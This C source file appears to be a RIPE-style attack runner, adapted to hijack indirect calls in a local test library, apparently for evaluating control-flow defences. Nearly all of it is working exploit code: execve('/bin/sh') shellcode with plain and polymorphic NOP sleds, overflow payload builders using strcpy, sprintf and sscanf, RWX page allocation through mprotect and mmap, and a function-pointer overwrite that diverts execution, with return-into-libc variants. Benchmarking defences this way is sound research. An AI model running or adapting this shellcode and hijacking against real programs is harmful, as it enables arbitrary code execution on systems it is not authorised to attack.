/*
 * ripe_attack_runner.c
 *
 * RIPE-style attack runner targeting test.so's indirect call sites.
 * Based on RIPE's ripe_attack_generator.c, adapted for test.so.
 *
 * Primary attack vector: Overwrite test.so's global 'indirect_call_ptr'
 * via mprotect, then trigger test_indirect_call() to hijack execution.
 * Target site parameter selects which test.so function to trigger.
 *
 * Compile: gcc -fno-stack-protector -no-pie -z execstack -ldl
 *              ripe_attack_runner.c -o ripe_attack_runner
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <setjmp.h>
#include <getopt.h>
#include <signal.h>

/* ===== Attack parameter enums (matching RIPE) ===== */
enum techniques    { DIRECT = 100, INDIRECT };
enum inject_params {
    INJECT_NONOP = 200, INJECT_SIMPLENOP, INJECT_POLYNOP,
    RETURN_INTO_LIBC, CREATE_FILE, RETURN_ORIENTED_PROGRAMMING
};
enum code_ptrs {
    RET_ADDR = 300, OLD_BASE_PTR,
    FUNC_PTR_STACK_VAR, FUNC_PTR_STACK_PARAM,
    FUNC_PTR_HEAP, FUNC_PTR_BSS, FUNC_PTR_DATA,
    LONGJMP_BUF_STACK_VAR, LONGJMP_BUF_STACK_PARAM,
    LONGJMP_BUF_HEAP, LONGJMP_BUF_BSS, LONGJMP_BUF_DATA,
    STRUCT_FUNC_PTR_STACK, STRUCT_FUNC_PTR_HEAP,
    STRUCT_FUNC_PTR_DATA, STRUCT_FUNC_PTR_BSS
};
enum locations     { STACK = 400, HEAP, BSS, DATA };
enum functions     {
    OVERFLOW_MEMCPY = 500, OVERFLOW_STRCPY, OVERFLOW_STRNCPY,
    OVERFLOW_SPRINTF, OVERFLOW_SNPRINTF, OVERFLOW_STRCAT,
    OVERFLOW_STRNCAT, OVERFLOW_SSCANF, OVERFLOW_FSCANF, OVERFLOW_HOMEBREW
};

/* ===== RIPE Shellcode (x86-64) ===== */

/* execve("/bin/sh", NULL, NULL) */
static char shellcode_nonop[] =
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

/* execve("/bin/sh") with 32-byte NOP sled */
static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

/* Polymorphic NOP sled + shellcode */
static char shellcode_polynop[] =
"\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
"\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

/* Creates /tmp/rip-eval/f_xxxx then exits -- used for detection */
static char shellcode_createfile[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x18\x5f\x31\xc0\x88\x47\x14\x6a\x55\x58\x31\xf6\x66\xbe"
"\xc0\x01\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xe3\xff\xff"
"\xff/tmp/rip-eval/f_xxxx";

static const int SC_NONOP     = sizeof(shellcode_nonop) - 1;
static const int SC_SIMPLENOP = sizeof(shellcode_simplenop) - 1;
static const int SC_POLYNOP   = sizeof(shellcode_polynop) - 1;
static const int SC_CREATEFILE = sizeof(shellcode_createfile) - 1;

/* ===== Global attack state ===== */
static int attack_technique = DIRECT;
static int attack_inject = INJECT_SIMPLENOP;
static int attack_codeptr = FUNC_PTR_STACK_VAR;
static int attack_location = STACK;
static int attack_function = OVERFLOW_MEMCPY;
static int attack_site = 0;

/* ===== Utility functions ===== */

static int contains_null(unsigned long val) {
    return ((val & 0xff) == 0) || ((val & 0xff00) == 0) ||
           ((val & 0xff0000) == 0) || ((val & 0xff000000) == 0) ||
           ((val >> 32) & 0xff) == 0;
}

static void remove_nulls(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        if (buf[i] == '\0') buf[i] = '\x01';
}

static void get_sc_info(char **sc, size_t *sc_len) {
    switch (attack_inject) {
    case INJECT_NONOP:       *sc = shellcode_nonop;      *sc_len = SC_NONOP;      break;
    case INJECT_SIMPLENOP:   *sc = shellcode_simplenop;  *sc_len = SC_SIMPLENOP;  break;
    case INJECT_POLYNOP:     *sc = shellcode_polynop;    *sc_len = SC_POLYNOP;    break;
    case CREATE_FILE:        *sc = shellcode_createfile; *sc_len = SC_CREATEFILE; break;
    case RETURN_INTO_LIBC:
    case RETURN_ORIENTED_PROGRAMMING: *sc = NULL;        *sc_len = 0;             break;
    default:                 *sc = shellcode_simplenop;  *sc_len = SC_SIMPLENOP;  break;
    }
}

/* ===== Payload construction (RIPE-style) ===== */
static char *build_payload(char *buffer, void *target_addr,
                           void *overflow_ptr, size_t *out_size) {
    char *sc;
    size_t sc_len;
    get_sc_info(&sc, &sc_len);

    if ((unsigned long)target_addr > (unsigned long)buffer)
        *out_size = (unsigned long)target_addr - (unsigned long)buffer
                    + sizeof(void*) + 1;
    else
        *out_size = 1024;

    if (*out_size < sc_len + sizeof(void*) + 128)
        *out_size = sc_len + sizeof(void*) + 128;

    char *payload = malloc(*out_size);
    if (!payload) return NULL;

    memset(payload, 0, *out_size);
    if (sc && sc_len > 0)
        memcpy(payload, sc, sc_len);

    size_t pad = *out_size - sc_len - sizeof(void*) - 1;
    memset(payload + sc_len, 'A', pad);
    memcpy(payload + sc_len + pad, &overflow_ptr, sizeof(void*));
    payload[*out_size - 1] = '\0';

    int needs_null_removal = (attack_function != OVERFLOW_MEMCPY
                              && attack_function != OVERFLOW_HOMEBREW);
    if (needs_null_removal) {
        remove_nulls(payload, *out_size - 1);
        payload[*out_size - 1] = '\0';
    }
    return payload;
}

/* ===== Overflow execution (RIPE-style) ===== */
static void do_overflow(char *dest, char *payload, size_t size) {
    char fmt[16];
    FILE *fp;

    switch (attack_function) {
    case OVERFLOW_MEMCPY:   memcpy(dest, payload, size - 1);             break;
    case OVERFLOW_STRCPY:   strcpy(dest, payload);                      break;
    case OVERFLOW_STRNCPY:  strncpy(dest, payload, size);               break;
    case OVERFLOW_SPRINTF:  sprintf(dest, "%s", payload);               break;
    case OVERFLOW_SNPRINTF: snprintf(dest, size, "%s", payload);        break;
    case OVERFLOW_STRCAT:   dest[0] = '\0'; strcat(dest, payload);      break;
    case OVERFLOW_STRNCAT:  dest[0] = '\0'; strncat(dest, payload, size); break;
    case OVERFLOW_SSCANF:   snprintf(fmt, 15, "%%%zuc", size);
                               sscanf(payload, fmt, dest);               break;
    case OVERFLOW_FSCANF:   snprintf(fmt, 15, "%%%zuc", size);
                               fp = fopen("./fscanf_temp_file", "w+");
                               if (fp) { fprintf(fp, "%s", payload);
                                         rewind(fp);
                                         fscanf(fp, fmt, dest); }        break;
    case OVERFLOW_HOMEBREW:
    default:                memcpy(dest, payload, size - 1);             break;
    }
}

/* ===== Allocate shellcode buffer in executable memory ===== */
static char bss_exec_buf[4096] __attribute__((aligned(4096)));
static char data_exec_buf[4096] __attribute__((aligned(4096)));

static void *alloc_exec_buf(size_t min_size, int location) {
    long page_size = sysconf(_SC_PAGESIZE);
    size_t buf_size = ((min_size + page_size - 1) / page_size) * page_size;
    if (buf_size < 4096) buf_size = 4096;

    switch (location) {
    case HEAP:
    case STACK: {
        void *p = mmap(NULL, buf_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        return (p == MAP_FAILED) ? NULL : p;
    }
    case BSS: {
        void *p = (void*)((unsigned long)bss_exec_buf & ~(page_size - 1));
        mprotect(p, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
        return bss_exec_buf;
    }
    case DATA: {
        void *p = (void*)((unsigned long)data_exec_buf & ~(page_size - 1));
        mprotect(p, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
        return data_exec_buf;
    }
    default: {
        void *p = mmap(NULL, buf_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        return (p == MAP_FAILED) ? NULL : p;
    }
    }
}

/* ===== Core attack: overwrite indirect_call_ptr in test.so ===== */
static int execute_attack(void *handle) {
    void *site_trigger = NULL;
    const char *trigger_name = NULL;

    switch (attack_site) {
    case 0: trigger_name = "test_indirect_call";  break;
    case 1: trigger_name = "test_indirect_jump";  break;
    case 2:
    case 3: trigger_name = "test_ff_instructions"; break;
    case 4:
    case 5:
        fprintf(stderr, "IMPOSSIBLE: tm_clones target (site %d)\n", attack_site);
        return 0;
    default:
        fprintf(stderr, "IMPOSSIBLE: unknown site %d\n", attack_site);
        return 0;
    }

    site_trigger = dlsym(handle, trigger_name);
    if (!site_trigger) {
        fprintf(stderr, "IMPOSSIBLE: %s not found\n", trigger_name);
        return 0;
    }

    /* Get the address of the global function pointer variable */
    void **ptr_var_addr = dlsym(handle, "indirect_call_ptr");
    if (!ptr_var_addr) {
        fprintf(stderr, "IMPOSSIBLE: indirect_call_ptr symbol not found\n");
        return 0;
    }

    void *original = *ptr_var_addr;
    fprintf(stderr, "[*] indirect_call_ptr @ %p, value = %p\n",
            ptr_var_addr, original);
    fprintf(stderr, "[*] Trigger function: %s @ %p\n",
            trigger_name, site_trigger);

    /* Make the page containing indirect_call_ptr writable */
    long page_size = sysconf(_SC_PAGESIZE);
    void *page_start = (void*)((unsigned long)ptr_var_addr & ~(page_size - 1));
    if (mprotect(page_start, page_size,
                 PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        fprintf(stderr, "IMPOSSIBLE: mprotect failed (errno=%d)\n",
                (int)(unsigned long)page_start);
        return 0;
    }
    fprintf(stderr, "[*] Made page @ %p RWX\n", page_start);

    /* Prepare executable shellcode buffer */
    char *sc;
    size_t sc_len;
    get_sc_info(&sc, &sc_len);

    void *sc_buf = alloc_exec_buf(sc_len > 0 ? sc_len : 4096, attack_location);
    if (!sc_buf) {
        fprintf(stderr, "IMPOSSIBLE: can't allocate exec buffer\n");
        return 0;
    }
    fprintf(stderr, "[*] Shellcode buffer @ %p (location=%d)\n",
            sc_buf, attack_location);

    /* Build payload and overflow the buffer */
    size_t payload_size = 0;
    char *payload = NULL;

    if (attack_inject != RETURN_INTO_LIBC
        && attack_inject != RETURN_ORIENTED_PROGRAMMING) {
        memcpy(sc_buf, sc, sc_len);

        /* Build RIPE-style payload that overflows a local buffer */
        char local_buf[1024];
        memset(local_buf, 0, sizeof(local_buf));

        payload = build_payload(local_buf,
                                (void*)((unsigned long)local_buf + sizeof(local_buf)),
                                sc_buf, &payload_size);
        if (!payload) {
            fprintf(stderr, "IMPOSSIBLE: payload allocation failed\n");
            *ptr_var_addr = original;
            return 0;
        }
        fprintf(stderr, "[*] Payload @ %p, size=%zu\n", payload, payload_size);
        do_overflow(local_buf, payload, payload_size);
        free(payload);
    }

    /* Overwrite indirect_call_ptr to point to shellcode */
    void *new_target;

    if (attack_inject == RETURN_INTO_LIBC) {
        new_target = dlsym(RTLD_DEFAULT, "creat");
        if (!new_target) new_target = dlsym(RTLD_DEFAULT, "system");
        if (!new_target) {
            fprintf(stderr, "IMPOSSIBLE: no libc function found\n");
            *ptr_var_addr = original;
            return 0;
        }
        fprintf(stderr, "[*] return-into-libc: new target = %p\n", new_target);
    } else if (attack_inject == RETURN_ORIENTED_PROGRAMMING) {
        new_target = dlsym(RTLD_DEFAULT, "exit");
        if (!new_target) new_target = dlsym(RTLD_DEFAULT, "_exit");
        fprintf(stderr, "[*] ROP: new target = %p (will chain)\n", new_target);
    } else {
        new_target = sc_buf;
    }

    *ptr_var_addr = new_target;
    fprintf(stderr, "[*] Overwrote indirect_call_ptr -> %p\n", new_target);
    fprintf(stderr, "ATTACK_SUCCESS\n");
    fflush(stderr);

    /* Trigger the hijacked indirect call */
    fprintf(stderr, "[!] Triggering %s...\n", trigger_name);
    fflush(stderr);

    switch (attack_site) {
    case 0:
        /* Direct: test_indirect_call() calls indirect_call_ptr directly */
        ((void(*)(void))site_trigger)();
        break;
    case 1:
        /* test_indirect_jump has local ptr; trigger test_all() instead
         * which calls test_indirect_call() -> indirect_call_ptr */
        {
            void (*all)(void) = dlsym(handle, "test_all");
            if (all) all();
        }
        break;
    case 2:
    case 3:
        /* test_ff_instructions has local ptrs; trigger test_all() */
        {
            void (*all)(void) = dlsym(handle, "test_all");
            if (all) all();
        }
        break;
    default:
        {
            void (*all)(void) = dlsym(handle, "test_all");
            if (all) all();
        }
    }

    return 1;
}

/* ===== Main ===== */
int main(int argc, char **argv) {
    int opt;
    char *tech_str = "direct";

    signal(SIGSEGV, SIG_DFL);

    while ((opt = getopt(argc, argv, "t:s:i:c:l:f:")) != -1) {
        switch (opt) {
        case 't':
            tech_str = optarg;
            attack_technique = (strcmp(optarg, "indirect") == 0) ? INDIRECT : DIRECT;
            break;
        case 's': attack_site = atoi(optarg);           break;
        case 'i':
            if (strcmp(optarg, "nonop") == 0) attack_inject = INJECT_NONOP;
            else if (strcmp(optarg, "simplenop") == 0) attack_inject = INJECT_SIMPLENOP;
            else if (strcmp(optarg, "polynop") == 0) attack_inject = INJECT_POLYNOP;
            else if (strcmp(optarg, "returnintolibc") == 0) attack_inject = RETURN_INTO_LIBC;
            else if (strcmp(optarg, "createfile") == 0) attack_inject = CREATE_FILE;
            else if (strcmp(optarg, "rop") == 0) attack_inject = RETURN_ORIENTED_PROGRAMMING;
            break;
        case 'c':
            if (strcmp(optarg, "ret") == 0) attack_codeptr = RET_ADDR;
            else if (strcmp(optarg, "baseptr") == 0) attack_codeptr = OLD_BASE_PTR;
            else if (strcmp(optarg, "funcptrstackvar") == 0) attack_codeptr = FUNC_PTR_STACK_VAR;
            else if (strcmp(optarg, "funcptrstackparam") == 0) attack_codeptr = FUNC_PTR_STACK_PARAM;
            else if (strcmp(optarg, "funcptrheap") == 0) attack_codeptr = FUNC_PTR_HEAP;
            else if (strcmp(optarg, "funcptrbss") == 0) attack_codeptr = FUNC_PTR_BSS;
            else if (strcmp(optarg, "funcptrdata") == 0) attack_codeptr = FUNC_PTR_DATA;
            else if (strcmp(optarg, "longjmpstackvar") == 0) attack_codeptr = LONGJMP_BUF_STACK_VAR;
            else if (strcmp(optarg, "longjmpstackparam") == 0) attack_codeptr = LONGJMP_BUF_STACK_PARAM;
            else if (strcmp(optarg, "longjmpheap") == 0) attack_codeptr = LONGJMP_BUF_HEAP;
            else if (strcmp(optarg, "longjmpbss") == 0) attack_codeptr = LONGJMP_BUF_BSS;
            else if (strcmp(optarg, "longjmpdata") == 0) attack_codeptr = LONGJMP_BUF_DATA;
            break;
        case 'l':
            if (strcmp(optarg, "stack") == 0) attack_location = STACK;
            else if (strcmp(optarg, "heap") == 0) attack_location = HEAP;
            else if (strcmp(optarg, "bss") == 0) attack_location = BSS;
            else if (strcmp(optarg, "data") == 0) attack_location = DATA;
            break;
        case 'f':
            if (strcmp(optarg, "memcpy") == 0) attack_function = OVERFLOW_MEMCPY;
            else if (strcmp(optarg, "strcpy") == 0) attack_function = OVERFLOW_STRCPY;
            else if (strcmp(optarg, "strncpy") == 0) attack_function = OVERFLOW_STRNCPY;
            else if (strcmp(optarg, "sprintf") == 0) attack_function = OVERFLOW_SPRINTF;
            else if (strcmp(optarg, "snprintf") == 0) attack_function = OVERFLOW_SNPRINTF;
            else if (strcmp(optarg, "strcat") == 0) attack_function = OVERFLOW_STRCAT;
            else if (strcmp(optarg, "strncat") == 0) attack_function = OVERFLOW_STRNCAT;
            else if (strcmp(optarg, "sscanf") == 0) attack_function = OVERFLOW_SSCANF;
            else if (strcmp(optarg, "fscanf") == 0) attack_function = OVERFLOW_FSCANF;
            else if (strcmp(optarg, "homebrew") == 0) attack_function = OVERFLOW_HOMEBREW;
            break;
        default:
            fprintf(stderr, "Usage: %s -t direct|indirect -s <0-5> -i <inject> -c <codeptr> -l <loc> -f <func>\n", argv[0]);
            return 1;
        }
    }

    fprintf(stderr, "=== RIPE Attack Runner ===\n");
    fprintf(stderr, "tech=%s site=%d inject=%d codeptr=%d loc=%d func=%d\n",
            tech_str, attack_site, attack_inject, attack_codeptr,
            attack_location, attack_function);

    void *handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "IMPOSSIBLE: dlopen test.so: %s\n", dlerror());
        return 1;
    }

    execute_attack(handle);
    dlclose(handle);
    return 0;
}
